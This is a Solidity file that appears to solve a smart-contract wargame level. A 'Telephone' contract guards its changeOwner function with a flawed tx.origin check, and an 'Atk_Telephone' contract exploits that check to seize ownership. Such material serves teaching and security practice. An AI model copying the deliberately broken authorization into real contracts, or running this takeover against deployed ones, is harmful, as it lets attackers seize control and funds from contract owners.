// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Atk_Telephone {
    Telephone public target;

    constructor(address _addr) {
        target = Telephone(_addr);
    }

    function atk() public {
        target.changeOwner(msg.sender);
    }

}

